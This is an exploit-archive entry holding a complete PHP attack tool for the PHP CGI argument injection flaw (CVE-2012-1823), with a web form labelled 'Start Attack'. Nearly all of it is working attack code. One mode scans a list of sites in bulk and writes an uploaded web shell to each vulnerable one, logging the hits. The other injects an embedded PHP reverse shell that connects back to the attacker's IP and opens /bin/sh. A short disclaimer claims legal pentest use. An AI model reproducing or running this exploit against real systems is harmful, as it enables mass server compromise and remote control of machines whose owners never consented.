@@ -1,0 +1,252 @@
+id: 18314
+date: 05/20/2012
+title: PHP CGI Argument Injection Remote Exploit (PHP Version)
+author: Mostafa Azizi
+cves: 
+
+<?php 
+
+######################################### www.bugreport.ir ######################################## 
+#  
+# Title:                  PHP CGI Argument Injection Remote Exploit V0.3 - PHP Version
+# Vendor:                 http://www.php.net 
+# Vulnerable Version:     PHP up to version 5.3.12 and 5.4.2  
+# Exploitation:           Remote 
+# Original Advisory:      http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/ 
+# Original Exploit URL:   http://www.bugreport.ir/79/exploit.htm 
+# CVE:                    CVE-2012-1823 
+# Coded By:               Mostafa Azizi (admin[@]0-Day[dot]net) 
+################################################################################################### 
+
+/* After release of vendor supplied patch for PHP CGI Argument Injection vulnerabilities, we're going to submit related POC for this issue in PHP for legal PenTest & educational purposes.
+This tool may be used for legal purposes only.  Users take full responsibility for any actions performed using this tool.
+The author accepts no liability for damage caused by this tool.  If these terms are not acceptable to you, then do not use this tool.*/
+
+error_reporting(0); 
+ini_set("max_execution_time",0); 
+ini_set("default_socket_timeout", 10); 
+ob_implicit_flush (1); 
+
+echo'<html>  
+<head>  
+<title>PHP CGI Argument Injection Remote Exploit</title>  
+</head>  
+<p align="center"><font size="4" color="#5E767E">PHP CGI Argument Injection</font></p>  
+<p align="center"><font size="3" color="#4E8975">Coded by: Mostafa Azizi (admin[@]0-Day[dot]net)</font></p>  
+<body bgcolor="#00000">  
+<table align="center" border="5"> 
+<tr> 
+    <th><p align="center"><font size="4" color="#8BB381">Mass File Uploader</font></p>  
+</th> 
+<th></th> 
+    <th><p align="center"><font size="4" color="#8BB381">Reverse Shell</font></p>  
+</th> 
+  </tr> 
+<tr> 
+    <td><form name="form1" action="'.$SERVER[PHP_SELF].'" enctype="multipart/form-data"  method="post">  
+      </br> 
+          <p></font><font color="#FFF8C6" >Please specify a file to scan:           </font></br><input type="file" name="listfile" size="40"><font color="#FF0000"> * </font>  
+          <p></font><font color="#FFF8C6" >Please specify a file to upload:           </font></br><input type="file" name="datafile" size="40"><font color="#FF0000"> * </font>  
+          <p><font color="#FFF8C6" >  specify a port (default is 80):             </font></br><input name="port" size="20"><span class="Stile5"></span></p>  
+          <p><font color="#FFF8C6" >  Proxy (ip:port):                                 </font></br><input name="proxy" size="20"><span class="Stile5"></span></p>  
+          <p align="center"> <span class="Stile5"><font color="#FF0000">* </font><font color="white" >fields are required</font></font></span></p>  
+      </br> 
+          <p align="center"><input type="submit" value="Start Attack" name="Submit"></p>  
+        </form> </td> 
+    <td></td> 
+    <td><form name="form1" action="'.$SERVER[PHP_SELF].'" enctype="multipart/form-data"  method="post">  
+      </br> 
+      <p></font><font color="#FFF8C6" > hostname (ex: www.sitename.com):</font></br><input name="host" size="20"> <span class="Stile5"></span></p>  
+          <p></font><font color="#FFF8C6" > Your IP (ex: 173.194.35.169 ):            </font></br><input name="lip" size="20"> <span class="Stile5"></span></p>  
+          <p><font color="#FFF8C6" >  Your Port (ex: 80):</font></br><input name="lport" size="20"> <span class="Stile5"></span></p> 
+          </br></br> 
+          <p align="center"> <span class="Stile5"><font color="#FF0000">All </font><font color="white" >fields are required</font></font></span></p>  
+          </br> 
+          <p align="center"><input type="submit" value="Start Attack" name="Submit2"></p>  
+        </form> </td> 
+  </tr> 
+</table> 
+</font>  
+<table width="90%">  
+  <tbody>  
+    <tr>  
+      <td width="43%" align="left">  
+         
+      </td>  
+    </tr>  
+  </tbody>  
+</table>  
+</body></html>';  
+
+  $host    = $_POST['host']; 
+  $lip     = $_POST['lip']; 
+  $lport   = $_POST['lport']; 
+  $port    = $_POST['port']; 
+  $proxy   = $_POST['proxy']; 
+  $list    = file($_FILES['listfile']['tmp_name']); 
+  $file    = base64_encode(gzdeflate(file_get_contents($_FILES['datafile']['tmp_name']))); 
+  $shell   = "gzinflate(base64_decode(\"$file\"))"; 
+
+if (isset($_POST['Submit2']) && $host != '' && $lip != '' && $lport != '')  
+{ 
+	/*pentestmonkey's php-reverse-shell. 
+	Limitations: proc_open and stream_set_blocking require PHP version 4.3+, or 5+ */ 
+
+                                    /* Connect Back */ 
+			
+	$payload = "<?php set_time_limit (0); \$VERSION = \"1.0\"; \$ip = '$lip';  \$port = $lport; \$chunk_size = 1400; \$write_a = null; \$error_a = null; \$shell = 'uname -a; w; id; /bin/sh -i'; \$daemon = 0;\$debug = 0; if (function_exists('pcntl_fork')) { \$pid = pcntl_fork(); if (\$pid == -1) { printit(\"ERROR: Can't fork\"); exit(1);} if (\$pid) { exit(0);} if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } \$daemon = 1;} else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);if (!\$sock) { printit(\"\$errstr (\$errno)\"); exit(1);} \$descriptorspec = array(0 => array(\"pipe\", \"r\"),1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));\$process = proc_open(\$shell, \$descriptorspec, \$pipes);if (!is_resource(\$process)) { printit(\"ERROR: Can't spawn shell\"); exit(1);}stream_set_blocking(\$pipes[0], 0);stream_set_blocking(\$pipes[1], 0);stream_set_blocking(\$pipes[2], 0);stream_set_blocking(\$sock, 0);printit(\"Successfully opened reverse shell to \$ip:\$port\"); while (1) {    if (feof(\$sock)) { printit(\"ERROR: Shell connection terminated\"); break;} if (feof(\$pipes[1])) {printit(\"ERROR: Shell process terminated\");break;}\$read_a = array(\$sock, \$pipes[1], \$pipes[2]);\$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);if (in_array(\$sock, \$read_a)) {if (\$debug) printit(\"SOCK READ\");\$input = fread(\$sock, \$chunk_size);if(\$debug) printit(\"SOCK: \$input\");fwrite(\$pipes[0], \$input);}if (in_array(\$pipes[1], \$read_a)) {if (\$debug) printit(\"STDOUT READ\");\$input = fread(\$pipes[1], \$chunk_size);if (\$debug) printit(\"STDOUT: \$input\");fwrite(\$sock, \$input);}if (in_array(\$pipes[2], \$read_a)) {if (\$debug) printit(\"STDERR READ\");\$input = fread(\$pipes[2], \$chunk_size);    if (\$debug) printit(\"STDERR: \$input\");fwrite(\$sock, \$input);}}fclose(\$sock);fclose(\$pipes[0]);fclose(\$pipes[1]);fclose(\$pipes[2]);proc_close(\$process);function printit (\$string) {if (!\$daemon) {print \"\$string\n\";}} ?>"; 
+	$packet  = "POST ".$p."/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\r\n"; 
+	$packet .= "Host: ".$host."\r\n"; 
+	$packet .= "User-Agent: PHP CGI Argument Injection Exploiter\r\n"; 
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n"; 
+	$packet .= "Content-Length: ".strlen($payload)."\r\n\r\n"; 
+	$packet .= $payload."\r\n\r\n\r\n\r\n";    
+	sendpacket($packet,1,0,0); 
+
+}elseif (isset($_POST['Submit']) && $list != '' && $file != '')  
+{ 
+    if ($port=='') {$port=80;} 
+
+	for ($n =0; $n < count($list); $n++) 
+    { 
+
+        $siteAddbackup = $list[$n]; 
+        $siteAdd=str_replace("http://","",$siteAddbackup); 
+        preg_match('/^(?:(?:http|https):\/\/)?[^\/]+(\/.+\/)[^\/\.]+\.[^\/\.]+$/i',$siteAddbackup, $match);
+		$path = $match[1];
+		$pa  = strstr(trim($siteAdd),$path);
+		$host=trim(str_replace($pa,"",$siteAdd));
+		if ($path ==''){$path = "/"; }
+        if ($proxy=='') {$p=$path;} else {$p='http://'.$host.$path;} 
+                                      
+                                                          /* Checking Availability */ 
+          
+		$connection = fsockopen($host,$port); 
+		if (!$connection) 
+            // site is down 
+            { 
+                echo '<font color=red> No response from '.htmlentities($host).' ...<br></font>'; 
+                file_put_contents(realpath(dirname(__FILE__)).'/notconnected.txt', $siteAddbackup."\r\n", FILE_APPEND); 
+            } 
+		else 
+            // site is up 
+            { 
+                fclose($connection); 
+            Exploitable($host,$path,$p); 
+            }  
+
+}         
+}             
+
+Function Exploitable($host,$path,$p) 
+{ 
+    global $html; 
+    $i=0; 
+                                              /* Checking Exploitability */ 
+	$packet  = "GET ".$p."?-s HTTP/1.1\r\n"; 
+	$packet .= "Host: ".$host."\r\n"; 
+	$packet .= "User-Agent: PHP CGI Argument Injection Exploiter \r\n\r\n"; 
+	sendpacket($packet,1,0,0); 	
+	$str = array( 
+		'<code><span','<?'); 
+		foreach ($str as $value => $search){ 
+			if(stristr($html, $search) == TRUE) 
+            {$i=$i+1;}} 
+	switch($i) 
+	{ 
+	case 0: 
+	echo '<font color=red>'.$host.' Faild!<br></font>'; 
+	break; 
+	case 2: 
+	echo '<font color=#FFF8C6>'.$host.' Exploitable<br></font>'; 
+	Exploit($host,$path,$p); 
+	} 
+} 
+
+Function Exploit($host,$path,$p) 
+{          
+global $html, $shell; 
+                                            /* Exploiting */ 
+
+	$payload = "<?php \$myFile = \"legalpentest.php\"; \$filehandle = fopen(\$myFile, 'w') or die(\"can't open file\"); \$Data=$shell; fwrite(\$filehandle, \$Data);fclose(\$filehandle);";
+	$packet  = "POST ".$p."/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\r\n"; 
+	$packet .= "Host: ".$host."\r\n"; 
+	$packet .= "User-Agent: PHP CGI Argument Injection Exploiter\r\n"; 
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n"; 
+	$packet .= "Content-Length: ".strlen($payload)."\r\n\r\n"; 
+	$packet .= $payload."\r\n\r\n\r\n\r\n"; 
+	sendpacket($packet,1,0,0); 
+                                            /* Check for successfully uploaded */ 
+	$packet  = "HEAD ".$p."/legalpentest.php HTTP/1.1\r\n"; 
+	$packet .= "Host: ".$host."\r\n"; 
+	$packet .= "User-Agent: :) \r\n\r\n"; 
+	sendpacket($packet,1,0,0); 
+                     
+	if(stristr($html , '404 Not Found') == true)                                     
+		{ 
+		echo '<font color=#FFF8C6><br>Exploit Faild...<br>-------------------------------------------------------<br></font>'; 
+		} 
+		else { 
+		echo "<font color=#FFF8C6><br>Exploit Succeeded...<br>http://$host$path"."/legalpentest.php<br>-------------------------------------------------------<br></font>"; 
+		file_put_contents(realpath(dirname(__FILE__)).'/shell.txt', "http://$host$path"."/legalpentest.php\r\n", FILE_APPEND);
+		}                   
+} 
+
+
+function sendpacket($packet,$response = 0,$output = 0,$s=0) 
+{ 
+    $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; 
+    global $proxy, $host, $port, $html, $user, $pass; 
+    if ($proxy == '') 
+    { 
+        $ock = fsockopen($host,$port); 
+        stream_set_timeout($ock, 5); 
+        if (!$ock) 
+        { 
+            echo 'No response from '.htmlentities($host).' ...<br>'; 
+        stream_set_timeout($ock, 4); 
+        } 
+    } else 
+    { 
+        $parts = explode(':',$proxy); 
+       // echo '<font color=white>Connecting to proxy: '.$parts[0].':'.$parts[1].' ...<br><br/></font>'; 
+        $ock   = fsockopen($parts[0],$parts[1]); 
+        stream_set_timeout($ock, 5); 
+        if (!$ock)  
+        { 
+            echo 'No response from proxy...<br>'; 
+            fclose($ock);     
+        } 
+    } 
+
+            if ($ock) 
+            { 
+                fputs($ock,$packet); 
+                if ($response == 1) 
+                { 
+                    if ($proxy == '') 
+                    { 
+                        $html = ''; 
+                        while (!feof($ock)) 
+                        { 
+                            $html .= fgets($ock); 
+                        } 
+                    } else 
+                    { 
+                        $html = ''; 
+                        while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) 
+                        { 
+                            $html .= fread($ock,1); 
+                        } 
+                    } 
+                } else $html = ''; 
+
+                fclose($ock); 
+            } 
+} 
+?>
+
+
+
+
+#  0day.today [2023-03-22]  #
